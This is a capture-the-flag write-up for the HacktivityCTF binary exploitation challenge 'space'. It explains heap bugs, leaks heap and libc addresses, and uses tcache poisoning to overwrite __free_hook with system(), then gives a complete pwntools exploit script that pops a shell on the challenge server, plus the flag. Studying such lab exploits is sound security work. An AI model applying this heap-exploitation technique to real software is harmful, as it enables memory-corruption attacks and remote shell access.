@@ -1,0 +1,205 @@
+<!--Solve date: 08/02/2020-->
+
+<h1>HacktivityCTF - space</h1>
+
+<h2>Binary Exploitation - 350 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>In this challenge, we spawn a shell with tcache poisoning. As a usual start to a heap challenge, let's briefly discuss the various functions available to the user and how each of them affects the state of the heap.</p>
+
+<ol>
+    <li>
+        <p><b>Option 1</b> is to open an account. There are two calls to <code>malloc()</code>, one with size argument of 0x60 and the other with size argument 0x18. Offset 8 of the larger chunk is pointed to the smaller allocated chunk. Other fields in the larger chunk are initialized in the <code>registerAcct()</code> function, which does the following:</p>
+        <ul>
+            <li><p>The number of accounts allocated before the current one is stored at offset 0. Since this count is incremented with each allocation and decremented with each delete, this can be interpreted as an ID number for the account.</p></li>
+            <li><p>The first name is read to a 32-byte region starting at offset 0x10.</p></li>
+            <li><p>Similarly, the last name is read to a 32-byte region starting at 0x30.</p></li>
+            <li>
+                <p>We can <i>optionally</i> choose whether we want to set the details of an account expiration date, which is the smaller structure that was allocated.</p>
+                <ul>
+                    <li><p>Note that if we <i>do not</i> set this, the values will be <b>unintialized</b>.</p></li>
+                    <li><p>On the other hand, if we do choose to set it, then we enter a year (an integer written to offset 4), a month (a <i>32-byte</i> string written to offset 8), and a day (an integer written to offset 0).</p></li>
+                </ul>
+            </li>
+        </ul>
+        <p>After returning back to <code>main()</code>, we also can optionally set a comment. <code>malloc()</code> is called with the size of the comment. The size is moved to offset 0x58, and a pointer to the comment chunk is put at offset 0x50. The number of accounts is incremented.</p>
+    </li>
+    <li><p><b>Option 2</b> prints all of the open accounts. It loops through the number of accounts, getting the ID, first and last names, and expiration.</p></li>
+    <li><p><b>Option 3</b> prints a specific account. It <b>does not check</b> if the entered ID is within the accounts that are currently in use. In fact, it can be used to be used to leak the contents of any pointer on the stack.</p></li>
+    <li><p><b>Option 4</b> is used to delete the last account. It checks the length of the comment field, and if it is 0, it frees the comment, setting the pointer in the account chunk to 0. The expiration date and user accounts are similarly freed and pointers set to <code>NULL</code>.</p></li>
+    <li><p><b>Option 5</b> searches for a user named "Mark Naird" and prints some constant messages. It does not modify the heap.</p></li>
+</ol>
+
+<p>As we can easily see from the available functions, there are several vulnerabilities in this program:</p>
+
+<ul>
+    <li><p><b>A. Option 1:</b> Not clearing the expiration date field if the user does not choose to explicitly set it. It could contain metadata after a free which can be subsequently leaked.</p></li>
+    <li><p><b>B. Option 1:</b> Blantantly obvious heap overflow with the month field of the expiration date structure!</p></li>
+    <li><p><b>C. Option 3:</b> Not checking whether the ID is valid. It could be pointed to anywhere with a known offset relative to the stack to leak information.</p></li>
+</ul>
+
+<p>A small annoyance (but not a readily exploitable bug) is the fact that when an account is opened, the comment size is not set to 0 if no comment is specified. If a previous <code>free()</code> left the comment size non-zero, we would free whatever is in the comment field.</p>
+
+<h5>Defeating ASLR with Address Leaks</h5>
+
+<p>Our first task is to leak the heap and libc. <i>(It turns out that we don't actually need the heap address at all, but in the process of leaking libc, we inadvertently leak heap anyways.)</i> For this, we will take advantage of bug <b>A</b> discussed above. To leak the position of the heap is simple: we just need to free into tcache and reallocate from tcache. To leak libc is a bit tougher, but the idea is largely the same - instead of freeing into tcache, we need to free to the unsorted bin, which is implemented as a doubly-linked list with the backward pointer into the main arena of libc. Consider the following series of transactions:</p>
+
+<ol>
+    <li><p>Create an account (A) with comment size of 0x60 = 96. This emulates an account structure and will disrupt the 0x70-tcache.</p></li>
+    <li><p>Create an account (B) with comment size of 0x410 = 1040, which would be allocated with a chunk size of 0x420. Note that this is outside the tcache range, whose maximum chunk size is 0x410.</p></li>
+    <li><p>Create an account (C) with no comment. This prevents the large comment structure B(com) from the previous allocation from being merged with top chunk when we free it.</p></li>
+    <li>
+        <p>Free all three accounts A, B, C. Note that the structure of the heap after all the frees is</p>
+        <p><code>HEAP[tcache][0x70-size] -> A(acct) -> A(cmt) -> B(acct) -> C(acct) -> NULL</code></p>
+        <p><code>HEAP[tcache][0x20-size] -> A(expdate) -> B(expdate) -> C(expdate) -> NULL</code></p>
+        <p><code>LIBC[unsorted] <=> B(cmt)</code></p>
+    </li>
+    <li><p>Create an account (D) with no comment. Pretty obviously, the account and expiration date structures will come from the head of tcache lists, where the original account A was. Note that by not initializing the expiration date, offset 0 will give us a direct pointer to B(expdate)'s data section, giving us the heap leak.</p></li>
+    <li><p>Create an account (E) with no comment. Now, the original account A's <i>comment</i> structure will be used to service E's account, and the original account B's expiration date will service E's expiration. E's expiration date holds a leak to C(expdate)'s data section (although we don't really need it because of the leak from the previous step).</p></li>
+    <li><p>Create an account (F) with no comment. B(acct) chunk will service the account F's account structure. C(expdate) will service F's expiration date structure.</p></li>
+    <li><p>Finally, create another account (G). C(acct) chunk will be used as G's account structure. As for G's expiration date structure, the 0x20-tcache is now expty! So, because the unsorted chunk is not currently the last remainder and the size is not equal to the requested size, it will be put in a large bin, and B(cmt) will be  immediately carved from it (the remainder landing back in the unsorted bin). This gives us the required libc leak.</p></li>
+</ol>
+
+<p>The following shows the results of such an exploit on the remote server:</p>
+
+<img class = "small" src = "./images/hacktivity_space_1.png"/>
+
+<p class = "caption">Figure 1. Leaking heap and libc addresses through tcache and unsorted bin reallocations.</p>
+
+<p>We can easily reconstruct the original addresses by simply converting the decimal numbers to 32-bit hexadecimal integers and concatenating them. In the above example, the first heap leak is <code>(-14408416, 21874) -> (0xF76973D0, 0x5572) -> 0x5572_F76973D0</code>, and since we know that the start of B(expdate) is at offset 0x70 + 0x20 + 2 * 0x70 = 0x170 relative to the heap base, and the <i>data secton</i> of B(expdate), which is the leaked address, is at offset 0x10 relative to the start of the chunk, that the heap base is the leaked address <b>minus 0x180</b>. For our example, the heap base is <code>0x5572_F7697250</code>.</p>
+
+<p>Similarly, the base of libc is at a fixed offset relative to the leak <code>(-67944304, 32565) -> (0xFBF34090, 0x7F35) -> 0x7F35_FBF34090</code>. Debugging the binary with the same libc on a local version using a tool like GDB gives the offset <code>0x3EC090</code> of the associated large bin in the main arena. So in the example, the base of libc is leaked as <code>0x7F35_FBB48000</code>, which is properly page-aligned, as expected.</p>
+
+<h5>Tcache Poisoning and Arbitrary Write to Free Hook</h5>
+
+<p>We now have all the information we need to perform a write to deterministically get a shell. For this, we will take advantage of bug <b>B</b> discussed above - the overflow in the <code>month</code> field of an expiration date structure. The way we can overwrite the free hook is by poisoning a tcache-sized chunk. Consider the following series of operations, done <i>after</i> the procedures for the information leak described above.</p>
+
+<ol>
+    <li><p>From the last step from the leak procedure, create the chunk G with a comment of size 0x18 = 24 (to mimic an expiration date structure). It will be carved from the unsorted bin chunk B(cmt) right after G's expiration date and be put in the 0x20-tcache.</p></li>
+    <li><p>Free account G.</p></li>
+    <li>
+        <p>Create another account (H) that basically overlaps with where G was, with no comment. This time, we elect to set the expiration date.</p>
+        <ul>
+            <li><p>Set the first 8 bytes (year and date numbers) to whatever; they're part of the expiration date chunk data anyways.</p></li>
+            <li><p>For the month, fill the current chunk by writing 16 garbage characters, then overflowing the G(com) chunk's size and prev-in-use bit with 0x21, which is what it should be to begin with.</p></li>
+            <li><p>Now, write the address of the free hook to the forward pointer of the G(com) tcache chunk. We have now poisoned the 0x20-tcache. If we allocate two more 0x20-sized chunks, the second chunk's data will be set at the free hook!</p></li>
+        </ul>
+    </li>
+    <li>
+        <p>Create an account (I) with a comment of size 0x18 = 24. The expiration date will take G(com), but the comment will go directly to free hook!</p>
+        <ul>
+            <li><p>Write the address of <code>system()</code> to the comment.</p></li>
+            <li><p>From this point on, no more <code>free()</code> calls are allowed until we get a chunk that starts with the string <code>/bin/sh</code>!</p></li>
+        </ul>
+    </li>
+    <li><p>Create a final account (J) with a comment of size 0x20 (it doesn't really matter). As part of the comment, write <code>/bin/sh</code>.</p></li>
+    <li><p>Free account J. The free hook will be called first with our comment. Shell is popped!</p></li>
+</ol>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+ready = True
+
+if ready:
+    p = process("nc jh2i.com 50016", shell = True)
+    lib = ELF("./libc-2.27_chall.so")
+else:
+    p = process("./space", shell = True)
+    lib = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+
+def createAcct(expireMo = b'', commentLen = 0, comment = b''):
+    p.recvuntil(b"> ")
+    p.sendline(b'1')
+    p.recvuntil(b": ")
+    p.sendline(b"yr81")
+    p.recvuntil(b": ")
+    p.sendline(b"18ry")
+    p.recvuntil(b": ")
+    if len(expireMo):
+        p.sendline(b'y')
+        p.recvuntil(b": ")
+        p.sendline(b'0')
+        p.recvuntil(b": ")
+        p.send(expireMo)
+        p.recvuntil(b": ")
+        p.sendline(b'0')
+    else:
+        p.sendline(b'n')
+
+    p.recvuntil(b": ")
+    if commentLen:
+        p.sendline(b'y')
+        p.recvuntil(b": ")
+        p.sendline(str(commentLen))
+#        p.recvuntil(b":")
+        p.sendline(comment)
+    else:
+        p.sendline(b'n')
+
+    p.recvuntil(b": ")
+    p.sendline(b'n')
+    return
+
+def deleteLast(wait = True):
+    p.recvuntil(b"> ")
+    p.sendline(b'4')
+    if wait:
+        p.recvuntil(b": ")
+        p.sendline(b'n')
+
+    return
+
+def getExpire(UIDs):
+    p.recvuntil(b"> ")
+    p.sendline(b'2')
+    ret = []
+    for UID in UIDs:
+        p.recvuntil(b"Account uid: %d" % UID)
+        p.recvuntil("Account expires on")
+        x = p.recvline()
+        parts = x.split()
+        ret.append([int(parts[-2][: -1]), int(parts[-1])])
+
+    p.recvuntil(b": ")
+    p.sendline(b'n')
+    return ret
+
+createAcct(commentLen = 0x60)
+createAcct(commentLen = 0x410)
+createAcct()
+
+for i in range(3):
+    deleteLast()
+
+for i in range(3):
+    createAcct()
+
+createAcct(commentLen = 0x18)
+
+leaks = getExpire([0, 3])
+heap = leaks[0][0] + (leaks[0][1] << 32) - 0x180
+log.info("heap: %s" % (hex(heap)))
+lib.address = leaks[1][0] + (leaks[1][1] << 32) - 0x3ec090
+log.info("libc: %s" % (hex(lib.address)))
+
+deleteLast()
+createAcct(expireMo = 16 * b'A' + p64(0x21) + p64(lib.sym[b"__free_hook"]))
+createAcct(commentLen = 0x18, comment = p64(lib.sym[b"system"]))
+createAcct(commentLen = 0x20, comment = b"/bin/sh")
+deleteLast(wait = False)
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>flag{michael_scott_for_president}</code></p>
